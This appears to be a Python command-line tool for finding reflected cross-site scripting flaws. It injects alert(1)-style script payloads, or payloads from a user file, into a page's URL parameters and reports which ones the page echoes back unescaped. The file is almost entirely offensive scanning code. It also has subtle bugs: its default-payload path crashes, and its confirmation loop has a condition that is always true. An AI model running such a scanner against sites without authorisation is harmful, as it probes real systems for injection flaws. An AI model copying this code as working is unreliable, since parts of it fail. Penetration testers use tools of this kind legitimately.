#!/usr/bin/python3
import sys
import re
import requests
import os
import argparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def loadPayloads(filename):
    payloads = ['<script>alert(1);</script>','?><script>alert(1);</script>','<body onload="alert(1)">']

    if len(filename) == 0:
        print("payloads: "+payloads)
        return payloads
    else:
        payloads = []
        try:
            file = open(filename)
        except:
            print(f"{bcolors.FAIL}File does not exist. Cannot be opened.{bcolors.ENDC}")
            sys.exit(1)

        for i in file.readlines():
            payloads.append(i.strip())
        file.close()
        return payloads

def checkXSSReflection(var,url,cookie,filename):
    result = {}
    payloads = loadPayloads(filename)

    for i in var:
        print(f"{bcolors.HEADER}Testing {bcolors.BOLD}%s{bcolors.ENDC}"%(i))
        for j in payloads:
            tempUrl = url.replace(var[i],j)
            if cookie == None:
                page = requests.post(tempUrl)
            else:
                page = requests.post(tempUrl,cookies=cookie)

            for k in page.text.strip().split("\n"):
                if k.find(j) != -1:
                    if i not in result:
                        result[i] = []
                    result[i].append(j)
                    print(f"{bcolors.OKGREEN}\t%s works\n{bcolors.ENDC}"%(j))
    return result

def checkURL(url):
    if url[:7] != "http://" and url[:8] != "https://":
        url = "http://" + url #Assume website will upgrade http to https for now.
    if url.find('?') == -1:
        return (False, url)
    else:
        if url.split('?')[1] == "":
            return (False, url)
    return (True, url)

def getCookie(cookie):
    cookieArr = cookie.split(",")
    cookie = {}
    for i in cookieArr:
        x = i.split("=")
        if len(x) < 2:
            print(f"{bcolors.FAIL}Cookie is in incorrect format.\nBe sure this is the format.\nvar=param,var2=param2,var3=param3{bcolors.ENDC}")
            sys.exit(1)
        cookie[x[0]] = x[1]
    return cookie

def createArgParser():
    parser = argparse.ArgumentParser()
    parser.add_argument("URL",help="The URL to the page we will attempt a XSS (Reflected) attack on. Ensure the URL is wrapped in quotes.")
    parser.add_argument("--cookie",help="Add cookie info if needed. Format: var=param,var2=param2")
    parser.add_argument("--payloads",help="Path to a text file filled with XSS payloads. Must be seperated by newlines.")
    return parser

def main():
    parser = createArgParser()
    args = parser.parse_args()

    os.system("clear")

    url = args.URL
    cookie = args.cookie
    filename = args.payloads

    variables = {}

    (flag,url) = checkURL(url)

    if not flag:
        print(f"{bcolors.FAIL}URL is in incorrect format.\nBe sure the URL contains variables after the ? symbol.{bcolors.ENDC}")
        sys.exit(1)

    for i in url.split("?")[1].split("&"):
        x = i.split("=")
        variables[x[0]] = x[1]

    try:
        if cookie != None:
            cookie = getCookie(cookie)
            page = requests.post(url.split("?")[0],params=variables,cookies=cookie).text.strip()
        else:
            page = requests.post(url.split("?")[0],params=variables).text.strip()
    except requests.exceptions.ConnectionError:
        print(f"{bcolors.FAIL}Could not connect to the given URL.\nMake sure the host is up.\n\nExiting...{bcolors.ENDC}")
        sys.exit(1)

    lineNum = 1
    var = {}
    for i in page.split("\n"):
        for j in variables:
            x = re.findall(variables[j],i)
            if len(x) > 0:
                var[j] = variables[j]
                #print(f"{bcolors.WARNING}%s in %s on line number: %d{bcolors.ENDC}"%(variables[j],i.strip(),lineNum))
                print(f"{bcolors.WARNING}Potential reflected variable: %s{bcolors.ENDC}"%(j))
        lineNum += 1

    if len(var) == 0:
        print(f"{bcolors.WARNING}No possible vulnerabilies for XSS (Reflected) found.{bcolors.ENDC}")
        userInput = ''
        while userInput != 'y' or userInput != 'n':
            userInput = input('Wish to continue? (y/n): ')
            if userInput == 'y':
                break
            elif userInput == 'n':
                sys.exit(0)
            else:
                print("Input needs to be y or n.")

    result = checkXSSReflection(var,url,cookie,filename)

    if len(result) == 0:
        print(f"{bcolors.WARNING}No vulnerabilies for XSS (Reflected) found.{bcolors.ENDC}")
        sys.exit(0)

    print(f"{bcolors.WARNING}The following variables have XSS (Reflected) Vulnerabilities listed with their successful payload(s).{bcolors.ENDC}")
    for i in result:
        print(f"{bcolors.HEADER}%s:{bcolors.ENDC}"%(i))
        for j in result[i]:
            print(f"{bcolors.OKGREEN}\t%s{bcolors.ENDC}\n"%(j))

try:
    if __name__ == "__main__":
        main()
except KeyboardInterrupt:
    print("\nDying now...")
    sys.exit(0)
